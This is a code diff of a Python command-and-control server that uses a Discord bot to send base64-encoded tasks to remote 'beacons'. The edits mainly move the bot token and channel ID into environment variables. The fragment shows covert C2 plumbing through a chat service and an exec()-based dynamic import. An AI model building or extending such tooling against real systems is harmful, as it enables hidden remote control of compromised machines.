@@ -1,6 +1,7 @@
 import discord
 import asyncio
 import argparse
+import os
 from utils import commonUtils
 from utils.encoders import encoder_base64
 from time import sleep
@@ -9,8 +10,8 @@ import config
 from threading import Thread
 
 # Discord bot token
-DISCORD_TOKEN = 'YOUR_DISCORD_BOT_TOKEN'
-COMMAND_CHANNEL_ID = 1234567890  # Replace with your channel ID where you'll send tasks
+DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
+COMMAND_CHANNEL_ID = os.getenv('COMMAND_CHANNEL_ID')  # Replace with your channel ID where you'll send tasks
 
 # Global dictionary to store beacon sessions
 beacons = {}
@@ -21,6 +22,7 @@ intents.message_content = True
 
 client = discord.Client(intents=intents)
 
+
 def importModule(modName, modType):
     """
     Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
@@ -29,6 +31,7 @@ def importModule(modName, modType):
     exec(prep_global)
     importName = "import utils." + modType + "s." + modName + " as " + modType
     exec(importName, globals())
+
 
 def createConnection(beaconId):
     """
@@ -41,12 +44,14 @@ def createConnection(beaconId):
         print(f"Establishing connection for beacon {beaconId}")
     return beaconId  # For Discord, the connection is tied to the beacon ID
 
+
 async def sendTask(channel, task, beaconId):
     """
     Sends a task to the beacon via a Discord message.
     """
     encoded_task = encoder_base64.encode(task)
     await channel.send(f"Task for {beaconId}: {encoded_task}")
+
 
 async def fetchResponse(channel, beaconId):
     """
